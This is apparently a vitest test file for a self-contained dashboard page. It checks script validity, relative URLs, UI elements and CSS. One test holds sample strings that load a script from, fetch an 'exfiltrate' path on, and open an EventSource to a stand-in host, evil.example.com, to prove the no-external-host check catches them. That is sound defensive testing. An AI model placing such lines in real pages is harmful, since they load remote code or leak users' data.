import ts from 'typescript'
import { expect, test } from 'vitest'
import { buildPage } from './page.js'
import { matchRunRoute } from './mission-control-server.js'

test('the page is a complete, self-contained HTML document', () => {
  const html = buildPage()
  expect(html).toMatch(/^<!doctype html>/i)
  expect(html).toContain('<style>')
  expect(html).toContain('<script>')
  expect(html).toContain('</html>')
})

// The inline <script> block is TypeScript source text embedded in a giant
// template literal - `tsc` only ever sees it as a string, so a corrupted
// escape sequence inside it (e.g. \n or \s written with a single backslash,
// which the OUTER template literal itself interprets as an escape before the
// text ever reaches the browser - turning /\n\s*\n/ into a regex containing
// real newline bytes) compiles cleanly and produces a page whose embedded
// script is a hard SyntaxError, silently killing every dynamic feature with
// no compiler or lint signal. ts.transpileModule only parses/transpiles the
// extracted text - it never executes it - so this surfaces the same syntax
// error a browser would hit, without ever running the extracted text as
// code the way a dynamic-code-execution approach would.
test('the inline client script is syntactically valid JavaScript', () => {
  const html = buildPage()
  const match = html.match(/<script>([\s\S]*)<\/script>/)
  expect(match).not.toBeNull()
  const script = match![1]!
  const { diagnostics } = ts.transpileModule(script, { reportDiagnostics: true })
  const messages = (diagnostics ?? []).map((d) => ts.flattenDiagnosticMessageText(d.messageText, '\n'))
  expect(messages).toEqual([])
})

// The back-link is only ever shown when nested under mission control's
// /run/<hash>/<runId>/ route (see the inline script's back.style.display
// logic below), so its relative href must resolve from exactly that depth
// back to mission control's own root - not to the /run/ path one level short
// of it, which matchRunRoute (mission-control-server.ts) 404s on since it
// requires both a hash and a runId segment.
test('the back-link resolves from the nested run route to mission control\'s actual root, not a 404', () => {
  const html = buildPage()
  const match = html.match(/id="back-link" href="([^"]+)"/)
  expect(match).not.toBeNull()
  const href = match![1]!
  const resolved = new URL(href, 'http://localhost/run/somehash/somerunid/').pathname
  expect(resolved).toBe('/')
  expect(matchRunRoute(resolved)).toBeNull()
})

test('nothing in the page reaches out to an external host', () => {
  const html = buildPage()
  // A bare http(s):// substring scan is too broad: it also flags legitimate,
  // never-fetched strings like the SVG XML namespace URI passed to
  // createElementNS. Instead, scope the check to the actual ways a page can
  // reach out to a network host: link/script tags, and fetch/XHR/WebSocket/
  // EventSource calls that target an http(s):// URL (same-origin calls like
  // fetch('/model') or new EventSource('/events') are fine).
  expect(html).not.toMatch(/<link\b/i)          // no external stylesheet/font
  expect(html).not.toMatch(/<script\s+src=/i)   // no external script (only inline <script>)
  expect(html).not.toMatch(/fetch\(\s*['"]https?:/i)
  expect(html).not.toMatch(/new\s+(XMLHttpRequest|WebSocket|EventSource)\(\s*['"]https?:/i)
  expect(html).not.toMatch(/cdn\./i)
})

test('the self-containment check still catches a real external-URL violation', () => {
  const maliciousSnippet = '<script src="https://evil.example.com/x.js"></script>'
  expect(maliciousSnippet).toMatch(/<script\s+src=/i)

  const maliciousFetch = `fetch('https://evil.example.com/exfiltrate')`
  expect(maliciousFetch).toMatch(/fetch\(\s*['"]https?:/i)

  const maliciousEventSource = `new EventSource('https://evil.example.com/events')`
  expect(maliciousEventSource).toMatch(/new\s+(XMLHttpRequest|WebSocket|EventSource)\(\s*['"]https?:/i)
})

test('the inline client wires EventSource(\'events\') and fetch(\'model\') as relative URLs', () => {
  // Deliberately relative, not '/events'/'/model': this same page is served
  // both standalone at '/' and nested under mission control's
  // '/run/<hash>/<runId>/' - an absolute path would always hit the site
  // root and 404 under mission control.
  const html = buildPage()
  expect(html).toContain(`new EventSource('events')`)
  expect(html).toContain(`fetch('model')`)
})

test('the page renders an empty-state message container for a run with no events yet', () => {
  const html = buildPage()
  expect(html).toContain('id="empty-state"')
})

test('the page defines a live-output section, hidden by default, with a tab strip and output body', () => {
  const html = buildPage()
  expect(html).toContain('id="live-output-section"')
  expect(html).toContain('id="live-tabs"')
  expect(html).toContain('id="live-output-body"')
})

test('the inline client renders live output tabs from the running nodes on every re-render', () => {
  const html = buildPage()
  expect(html).toContain('function renderLiveOutput(model)')
  expect(html).toContain('renderLiveOutput(model)') // called from render(model), not just defined
})

test('the default tab is the first running node, and clicking a tab is wired via addEventListener', () => {
  const html = buildPage()
  expect(html).toContain('selectedTab = running[0].id')
  expect(html).toContain('addEventListener')
})

test('the page has a Calls gauge, wired to totals.calls, distinct from iteration/replans', () => {
  const html = buildPage()
  expect(html).toContain('id="calls-label"')
  expect(html).toContain("document.getElementById('calls-label').textContent = String(model.totals.calls)")
})

test('the resume row includes a wall-minutes input alongside iterations/cost, prefilled from totals.maxWallMinutes and posted on resume', () => {
  const html = buildPage()
  expect(html).toContain('id="resume-wall-minutes"')
  expect(html).toContain('model.totals.maxWallMinutes')
  expect(html).toMatch(/maxWallMinutes:\s*wallMinutes/)
})

// Spend-by-agent's Nodes column previously joined every node id into one
// comma-separated string (g.nodeIds.join(', ')), which the cell's nowrap +
// ellipsis CSS then clipped once an agent backed many nodes. Each id must
// now render as its own child element instead, so nothing is ever hidden
// regardless of how many nodes one agent has.
test('the agent table renders each node id as a distinct element, not one joined string', () => {
  const html = buildPage()
  expect(html).not.toContain("g.nodeIds.join(', ')")
  expect(html).toContain('g.nodeIds.forEach(function (id) { nodeIdsCell.appendChild(htmlEl(\'div\', null, id)) })')
})

// The "this node: N tokens · $X (updates once it finishes)" line duplicated
// info already shown elsewhere (the per-node iteration list / Spend by
// Agent table) once a node finishes, and was misleading while running -
// it should be gone entirely, leaving only the role/agent line (r1).
test('the redundant "this node" tokens/cost line is removed from live-meta', () => {
  const html = buildPage()
  expect(html).not.toContain('this node: ')
  expect(html).not.toContain('updates once it finishes')
  // r1 (role/agent line) must still be present, untouched
  expect(html).toContain("r1.innerHTML = 'role <b>' + current.role + '</b>'")
})

// A single long plan version's <pre> must scroll internally instead of
// expanding the whole page's height without bound.
test('.plan-version pre has a bounded height with its own internal scroll', () => {
  const html = buildPage()
  const match = html.match(/\.plan-version pre\s*\{([^}]*)\}/)
  expect(match).not.toBeNull()
  const rule = match![1]!
  expect(rule).toMatch(/max-height:\s*\d/)
  expect(rule).toMatch(/overflow-y:\s*auto/)
})

// The DAG's svg viewBox/height already grow unbounded with node count -
// its container (#canvas-wrap) must cap that visually with its own
// max-height + scroll, and render() must auto-tail it the same way
// live-output-body already auto-tails itself.
test('#canvas-wrap caps the DAG height and auto-scrolls to follow new nodes', () => {
  const html = buildPage()
  const match = html.match(/#canvas-wrap\s*\{([^}]*)\}/)
  expect(match).not.toBeNull()
  const rule = match![1]!
  expect(rule).toMatch(/max-height:\s*\d/)
  expect(rule).toMatch(/overflow:\s*auto/)
  expect(html).toContain("canvasWrap.scrollTop = canvasWrap.scrollHeight")
})

// The svg's markup pins width to "100%"; leaving that attribute
// unoverridden means preserveAspectRatio shrinks the ENTIRE graph to
// stay visible as the viewBox's width grows, rather than ever
// overflowing #canvas-wrap - a linear dependency chain (a self-planning
// splice's mostly one-node-per-layer sequence) grows by x, not y, so this
// left it progressively squished and unreadable instead of scrollable.
// width must be set to the real content width, the same way height
// already is, and BOTH scroll axes must auto-tail - a chain grows by x,
// a bushy fan-out grows by y.
test('the DAG svg width is set to the real content width, not left at "100%", and both scroll axes auto-tail', () => {
  const html = buildPage()
  expect(html).toContain("svg.setAttribute('width', String(Math.max(maxX, 400)))")
  expect(html).toContain('canvasWrap.scrollLeft = canvasWrap.scrollWidth')
})
